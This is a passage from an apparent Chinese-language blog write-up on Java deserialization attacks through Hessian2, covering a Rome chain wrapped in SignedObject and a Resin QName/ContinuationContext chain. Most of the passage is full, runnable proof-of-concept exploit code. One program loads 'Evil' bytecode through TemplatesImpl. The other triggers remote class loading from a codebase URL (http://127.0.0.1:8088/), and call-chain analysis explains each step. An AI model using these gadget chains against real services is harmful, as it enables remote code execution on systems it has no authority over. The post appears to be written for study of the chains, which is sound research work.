<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">   kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">   <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">   <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br></pre></td></tr></table></figure></div>



<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有其他方法，通过对 <a class="link"   href="https://github.com/mbechler/marshalsec" >marshalsec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的利用链的分析，可以看到其有一个工具类，可以写了不使用构造器去获取类对象的方法，调用createWithoutConstructor 方法即可获取对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">        <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">        Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">    objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">    sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>其实还有个方法三，由于是个人学习发现的，本质上是等价于方法二的，这里就先不写了。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>通过上面的学习了解，我们就可以尝试构造出 payload 了。前面就正常扒Rome的链子，填入SignedObject，后面就用Hessian2去触发getter即可。比如下面我就用rome笔记中的第一个rome链来写。</p>
<p>个人感觉写的较冗长，不知道有没有可以优化的地方</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBean_TwiceSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> RomePayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将序列化字符串装入 SignedObject 中。</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> createWithoutConstructor(SignedObject.class);</span><br><span class="line">        setFieldValue(signedObject,<span class="string">&quot;content&quot;</span>,baos.toByteArray());</span><br><span class="line">        <span class="comment">// 一开始一直没触发，后来仔细跟才知道其他几个成员变量也得传值，不然在遍历getter时会出现空指针异常。</span></span><br><span class="line">        setFieldValue(signedObject,<span class="string">&quot;signature&quot;</span>,<span class="string">&quot;koishi&quot;</span>.getBytes());</span><br><span class="line">        setFieldValue(signedObject,<span class="string">&quot;thealgorithm&quot;</span>,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//再想办法触发 SignedObject 的 getter。</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> PayloadMapGenerator(signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(baos2);</span><br><span class="line">        hot.writeObject(hashMap2);</span><br><span class="line">        hot.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos2.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">PayloadMapGenerator</span><span class="params">(Object key)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(key.getClass(),key);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class,<span class="string">&quot;hello! koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(equalsBean,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        <span class="comment">// 这里后续在反射修改回来，不然懂得懂得，在put就会触发利用链</span></span><br><span class="line">        setFieldValue(equalsBean,<span class="string">&quot;_beanClass&quot;</span>, ToStringBean.class);</span><br><span class="line">        setFieldValue(equalsBean,<span class="string">&quot;_obj&quot;</span>,toStringBean);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">RomePayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//必须修改_bytecodes</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">koishi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;Cirno&quot;</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(koishi,<span class="string">&quot;I&#x27;m koishi dayo!!!&quot;</span>);</span><br><span class="line">        <span class="comment">//这里为什么不在上面ObjectBean声明的时候写，就是防止put的时候在本地触发（总所周知，map的put会去判断hash值，就会调用hashcode方法）</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templates);</span><br><span class="line">        setFieldValue(koishi,<span class="string">&quot;_equalsBean&quot;</span>,<span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, objectBean));</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h1 id="Resin-配合-Hessian2"><a href="#Resin-配合-Hessian2" class="headerlink" title="Resin 配合 Hessian2"></a>Resin 配合 Hessian2</h1><p><strong>添加依赖</strong></p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- contains QName --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>quercus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.45<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>调用链</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">XString#equals</span><br><span class="line">  QName#toString</span><br><span class="line">    ContinuationContext#composeName(java.lang.String, java.lang.String)</span><br><span class="line">      ContinuationContext#getTargetContext</span><br><span class="line">	    NamingManager#getContext</span><br><span class="line">  		  NamingManager#getObjectInstance </span><br><span class="line">   		    NamingManager#getObjectFactoryFromReference</span><br></pre></td></tr></table></figure></div>



<h2 id="分析-QName-toString远程类加载"><a href="#分析-QName-toString远程类加载" class="headerlink" title="分析-QName toString远程类加载"></a>分析-QName toString远程类加载</h2><p>Resin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 <code>com.sun.org.apache.xpath.internal.objects.XString</code> 的 <code>equals</code> 方法。</p>
<p>在Hessian2 对 HashMap 进行put时，触发 putVal 方法，在 putVal  中，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br></pre></td></tr></table></figure></div>

<p>key 为 Xstring ，k 为 QName，进而跟进 Xstring 的equals方法。（至于为什么这里是这两个值，看下文的奇葩问题分析内容）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210170754131.png"
                      alt="image-20230210170754131"
                ></p>
<p>进而触发 QName 的 toString 方法，在该方法中，会触发 <code>this._context.composeName</code>，这个 _context 就是我们之前设置好的 ContinuationContext 类对象。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210171612201.png"
                      alt="image-20230210171612201"
                ></p>
<p>继续看 ContinuationContext#composeName</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210171807540.png"
                      alt="image-20230210171807540"
                ></p>
<p>会调用本类的 getTargetContext 方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210171902375.png"
                      alt="image-20230210171902375"
                ></p>
<p>进而触发这个 cpe 的 getResolvedObj 方法，cpe就是 CannotProceedException  类，继续跟</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">          answer = getObjectInstance(obj, name, nameCtx, environment);</span><br><span class="line">      &#125; catch (NamingException e) &#123;</span><br><span class="line">          throw e;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>obj 是设置好的 Reference 类，继续跟最终就能实现远程工厂类的加载了，我就不细调了，最终位置在 NamingManager 的getObjectFactoryFromReference 方法下，通过codebase 和 工厂类名加载了类。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210172357645.png"
                      alt="image-20230210172357645"
                ></p>
<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><p><strong>unhash 方法参考别人的文章造的，知道作用就行，有闲时可以细究：<a class="link"   href="https://bchetty.com/blog/hashcode-of-string-in-java" >https://bchetty.com/blog/hashcode-of-string-in-java <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Resin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Resin_POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 定义一个远程的class 包含一个恶意攻击的对象的工厂类</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">codebase</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8088/&quot;</span>;</span><br><span class="line">        <span class="comment">// 对象的工厂类名（远程服务下的class文件名）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classFactory</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个CannotProceedException对象，并设置远程查找对象</span></span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cannotProceedException</span> <span class="operator">=</span> createWithoutConstructor(CannotProceedException.class);</span><br><span class="line">        cannotProceedException.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;koishi&quot;</span>,classFactory,codebase));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化ContinuationDirContext类</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">continuationContext</span> <span class="operator">=</span> (Context)createWithoutConstructor(Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>));</span><br><span class="line">        setFieldValue(continuationContext,<span class="string">&quot;cpe&quot;</span>,cannotProceedException);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里后面的两个参数貌似不是完全可以乱填的，但是可以填的确实有很多，测试如将下面的 Koishi 换成小写 koishi,则不会触发。</span></span><br><span class="line">        <span class="comment">// 根据调试发现貌似这里的值填某些内容会导致读取生成map时顺序出错。没细看，有兴趣可以去调着试试。</span></span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(continuationContext,<span class="string">&quot;Koishi&quot;</span>, <span class="string">&quot;Ilyn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置为相同的hashcode，使hash 比较通过，从而触发 XString equals方法。这里先随便写个值，后续反射修改。当然改 QName 也行</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sameHashCode</span> <span class="operator">=</span> unhash(qName.hashCode());</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(qName, <span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        expMap.put(xString, <span class="string">&quot;cirno&quot;</span>);</span><br><span class="line">        setFieldValue(xString,<span class="string">&quot;m_obj&quot;</span>,sameHashCode);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        <span class="comment">//序列化没有实现java.io.Serializable接口的类</span></span><br><span class="line">        output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        output.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bao.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">unhash</span><span class="params">(<span class="type">int</span> hash)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> ( target &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( target == Integer.MIN_VALUE )</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span> <span class="params">( StringBuilder partial, <span class="type">int</span> target )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="奇葩问题窥探"><a href="#奇葩问题窥探" class="headerlink" title="奇葩问题窥探"></a>奇葩问题窥探</h2><p><strong>在自己编写链子的过程中发现了两个奇葩问题：</strong></p>
<ul>
<li><p>HashMap 的put顺序不同，会对利用链造成影响</p>
</li>
<li><p>QName 实例化时，first值和rest值貌似有联系，foo和bar能行，有些个别其他字符串不行</p>
</li>
</ul>
<p>自己试着对这两个问题进行部分分析，能力有限不确保正确。</p>
<h3 id="针对第一个问题"><a href="#针对第一个问题" class="headerlink" title="针对第一个问题"></a>针对第一个问题</h3><p><strong>当我们正确输入内容：</strong></p>
